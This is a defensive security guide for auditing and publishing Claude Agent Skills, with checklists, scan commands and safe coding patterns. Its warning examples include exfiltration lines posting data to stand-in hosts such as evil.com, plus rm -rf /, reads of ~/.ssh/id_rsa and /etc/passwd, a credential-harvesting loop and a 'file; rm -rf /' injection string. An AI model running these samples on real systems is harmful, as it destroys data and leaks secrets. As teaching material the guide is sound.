# Agent Skills Security Guidelines

Comprehensive security practices for building and using Agent Skills safely.

## Overview

Agent Skills provide Claude with new capabilities through instructions and code. While powerful, this also means malicious skills can introduce vulnerabilities or exfiltrate data.

**Key Principle:** Treat skills like any other code—audit before use, trust but verify.

---

## Pre-Installation Security Checklist

Before installing any skill, complete this checklist:

### Source Verification
- [ ] Source is trusted (official repository, known author)
- [ ] Repository has active maintenance
- [ ] Commit history shows legitimate development
- [ ] No suspicious recent changes

### Initial Review
- [ ] Read all `.md` files for content
- [ ] Review all scripts for suspicious patterns
- [ ] Check for hardcoded credentials
- [ ] Verify no obfuscated code
- [ ] Confirm dependencies are minimal

### Network Check
- [ ] No external network connections
- [ ] No API calls to untrusted endpoints
- [ ] No data transmission to external services

---

## Audit Procedures

### Step 1: List All Files

```bash
# List all files in skill directory
find skill-name/ -type f

# Expected output:
# skill-name/SKILL.md
# skill-name/EXAMPLES.md
# skill-name/scripts/validator.sh
```

### Step 2: Review All Content

```bash
# Review each markdown file
for file in skill-name/*.md; do
    echo "=== $file ==="
    cat "$file"
    echo ""
done
```

### Step 3: Scan for Suspicious Patterns

```bash
# Scan for common dangerous patterns
cd skill-name

# Network access attempts
grep -r "requests\|urllib\|http\|https" .

# Code execution
grep -r "exec\|eval\|compile" .

# Obfuscation
grep -r "base64\|rot13\|encode\|decode" .

# File operations outside project
grep -r "\.\./\|~/\|/etc/\|/home/" .
```

### Step 4: Review Scripts Line by Line

```bash
# Display each script with line numbers
for script in skill-name/scripts/*; do
    if [ -f "$script" ]; then
        echo "=== $script ==="
        cat -n "$script"
        echo ""
    fi
done
```

---

## Suspicious Pattern Detection

### ❌ NEVER ALLOW: Data Exfiltration

```python
# Malicious: Sends data to external server
import requests
requests.post("https://evil.com", data=locals())

# Malicious: Encodes data in URL
import urllib
print(f"https://attacker.com/{base64.b64encode(secrets)}")
```

**Detection:** Look for `requests`, `urllib`, `httpx`, `http.client`

### ❌ NEVER ALLOW: Arbitrary Code Execution

```python
# Malicious: Executes arbitrary user input
exec(user_input)
eval(user_data)

# Malicious: Compiles and runs code
compile(source, filename, mode)
__import__(os.system)
```

**Detection:** Look for `exec`, `eval`, `compile`, `__import__`

### ❌ NEVER ALLOW: File System Abuse

```bash
# Malicious: Deletes files
rm -rf /
rm -rf ~/.*

# Malicious: Reads sensitive files
cat ~/.ssh/id_rsa
cat /etc/passwd
```

**Detection:** Look for `rm -rf`, paths outside project, `/etc/`, `~/.`

### ❌ NEVER ALLOW: Credential Harvesting

```python
# Malicious: Searches for credentials
import os
for root, dirs, files in os.walk('~'):
    for file in files:
        if file in ['.env', 'credentials.json']:
            print(open(os.path.join(root, file)).read())
```

**Detection:** Look for file traversal, `.env`, `credentials`, `secrets`

---

## Safe Pattern Examples

### ✓ ALLOW: Explicit File Operations

```python
# Safe: Explicit file operations with validation
import os
from pathlib import Path

def process_file(filename):
    # Validate filename
    if not filename.endswith('.md'):
        raise ValueError("Only .md files allowed")

    # Restrict to project directory
    project_dir = Path.cwd()
    file_path = project_dir / filename

    # Verify path doesn't escape project
    if not str(file_path.resolve()).startswith(str(project_dir.resolve())):
        raise ValueError("Access denied: path outside project")

    # Read file
    return file_path.read_text()
```

### ✓ ALLOW: Validated Input Processing

```python
# Safe: Input validation before processing
ALLOWED_EXTENSIONS = {'.py', '.js', '.md'}

def validate_input(filename):
    path = Path(filename).resolve()

    # Check extension
    if path.suffix not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Extension {path.suffix} not allowed")

    # Check path is within project
    if not str(path).startswith(str(Path.cwd().resolve())):
        raise ValueError("Path outside project directory")

    return path
```

### ✓ ALLOW: Clear Error Messages

```bash
# Safe: Clear, actionable error messages
#!/bin/bash

if [ ! -f "$INPUT_FILE" ]; then
    echo "ERROR: Input file not found: $INPUT_FILE"
    echo "Expected location: ./data/input.json"
    echo "Please check the file exists and try again."
    exit 1
fi
```

---

## Environment Constraints

Skills run with these security limitations:

| Constraint | Details | Rationale |
|------------|---------|-----------|
| **No network access** | No HTTP/HTTPS requests | Prevent data exfiltration |
| **No runtime installation** | No pip/npm install during execution | Environment stability |
| **Filesystem sandboxing** | Access limited to project directory | Prevent system abuse |
| **No subprocess execution** | Except via approved scripts | Explicit control |
| **No external API calls** | Cannot call services directly | Data isolation |

### What Skills CAN Do

- ✓ Read/write files within project directory
- ✓ Execute Python/JavaScript for data processing
- ✓ Use built-in libraries (pandas, numpy, etc.)
- ✓ Run approved scripts in `scripts/` directory

### What Skills CANNOT Do

- ✗ Make HTTP requests to external servers
- ✗ Install packages at runtime
- ✗ Access files outside project directory
- ✗ Execute arbitrary shell commands
- ✗ Access system environment variables

---

## Best Practices

### 1. Principle of Least Privilege

Request only the permissions needed:

```python
# ❌ Bad: Requests broad access
def process_all_files():
    for file in Path('/').rglob('*'):  # Entire filesystem
        process(file)

# ✓ Good: Specific, limited access
def process_markdown_files():
    for file in Path('.').glob('*.md'):  # Only .md files in current dir
        process(file)
```

### 2. Use Allowlists Over Blocklists

```python
# ❌ Bad: Blocklist (easily bypassed)
FORBIDDEN = {'exe', 'sh', 'bat'}
if ext not in FORBIDDEN:
    process(file)

# ✓ Good: Allowlist (default deny)
ALLOWED = {'md', 'py', 'js', 'json'}
if ext in ALLOWED:
    process(file)
```

### 3. Fail Closed (Deny by Default)

```bash
# ❌ Bad: Allows if validation fails
if validate_file "$file"; then
    process "$file"
else
    process "$file"  # Still processes!
fi

# ✓ Good: Denies if validation fails
if validate_file "$file"; then
    process "$file"
else
    echo "Validation failed"
    exit 1
fi
```

### 4. Transparent Operations

```markdown
## What This Script Does

This script validates Python files by:
1. Checking for syntax errors
2. Running pylint for code quality
3. Generating a report

**Files accessed:** `*.py` in current directory
**Network access:** None
**External dependencies:** None (uses system pylint)
```

### 5. Audit Trail

```bash
# Log all operations for transparency
echo "[$(date)] Starting validation" >> validation.log
echo "[$(date)] Processing $file" >> validation.log
echo "[$(date)] Complete: $result" >> validation.log
```

---

## Skill Publishing Security

If you're sharing skills with others:

### Before Publishing

1. **Remove sensitive information**
   ```bash
   # Check for secrets
   grep -ri "api_key\|secret\|password\|token" .
   ```

2. **Sanitize file paths**
   ```bash
   # Replace user-specific paths
   sed -i 's|/home/username|/home/user|g' SKILL.md
   ```

3. **Document security considerations**
   ```markdown
   ## Security Considerations

   - This skill reads all `.py` files in project directory
   - No network access required
   - No external dependencies
   - Safe for production codebases
   ```

### Repository Security

1. **Enable branch protection**
   - Require reviews for main branch
   - Status checks must pass

2. **Signed commits**
   ```bash
   git commit -S -m "Secure commit message"
   ```

3. **Dependency pinning**
   ```bash
   # Pin exact versions
   pip install package==1.2.3
   ```

---

## Incident Response

If you discover a security issue with a skill:

### Immediate Actions

1. **Stop using the skill**
   ```bash
   # Remove skill directory
   rm -rf ~/.claude/skills/suspicious-skill
   ```

2. **Review Claude Code logs**
   ```bash
   # Check for unusual activity
   tail -f ~/.claude/logs/claude-code.log
   ```

3. **Audit recent actions**
   - Review git history for unexpected commits
   - Check for modified files
   - Verify no credentials were exposed

### Reporting Issues

Report security issues to:

| Issue Type | Where to Report |
|------------|-----------------|
| Official Anthropic skills | security@anthropic.com |
| Third-party skills | Repository maintainer |
| Claude Code issues | https://github.com/anthropics/claude-code/issues |

### Disclosure Guidelines

When reporting security issues:

1. **Do NOT publicize** until fixed
2. **Provide details**: What you found, reproduction steps
3. **Allow time** for maintainers to fix
4. **Follow responsible disclosure**

---

## Common Vulnerabilities

### Vulnerability 1: Path Traversal

**Attack:** `../../../etc/passwd`

**Prevention:**
```python
from pathlib import Path

def safe_read(filename):
    path = Path(filename).resolve()
    project = Path.cwd().resolve()

    # Verify path is within project
    if not str(path).startswith(str(project)):
        raise ValueError("Access denied")

    return path.read_text()
```

### Vulnerability 2: Command Injection

**Attack:** `file; rm -rf /`

**Prevention:**
```python
import subprocess

# ❌ Bad: String concatenation
subprocess.run(f"cat {filename}")

# ✓ Good: List argument
subprocess.run(["cat", filename])
```

### Vulnerability 3: Resource Exhaustion

**Attack:** Infinite loop or memory exhaustion

**Prevention:**
```python
import resource

def set_limits():
    # Limit CPU time (60 seconds)
    resource.setrlimit(resource.RLIMIT_CPU, (60, 60))

    # Limit memory (1GB)
    resource.setrlimit(resource.RLIMIT_AS, (1024**3, 1024**3))
```

---

## Security Checklist for Skill Authors

Before publishing a skill:

### Content Security
- [ ] No hardcoded credentials
- [ ] No API keys or tokens
- [ ] No sensitive environment variables referenced
- [ ] User-specific paths removed

### Code Security
- [ ] All scripts audited for vulnerabilities
- [ ] Input validation on all user inputs
- [ ] Path traversal protection implemented
- [ ] Command injection prevention in place

### Documentation
- [ ] Security considerations documented
- [ ] File access patterns explained
- [ ] Network requirements stated (if any)
- [ ] Dependencies listed and justified

### Testing
- [ ] Tested with malicious inputs
- [ ] Tested with path traversal attempts
- [ ] Tested with oversized inputs
- [ ] Cross-model testing completed

---

## Summary

**Security Principles:**

1. **Audit before trust** - Review all code before use
2. **Principle of least privilege** - Minimal access required
3. **Transparency** - Document what the skill does
4. **Isolation** - Skills are sandboxed to project directory
5. **Vigilance** - Monitor for suspicious behavior

**Quick Reference:**

| Pattern | Safe? | Notes |
|---------|-------|-------|
| Reading project files | ✓ | Within project directory only |
| Writing project files | ✓ | Within project directory only |
| Network requests | ✗ | Not allowed |
| Runtime package install | ✗ | Not allowed |
| Executing approved scripts | ✓ | In `scripts/` directory only |
| Arbitrary shell commands | ✗ | Not allowed |
| Path traversal | ✗ | Blocked by sandbox |

---

**See also:**
- REFERENCE.md for technical security model
- BEST_PRACTICES.md for safe development patterns
- EVALUATION.md for security testing procedures
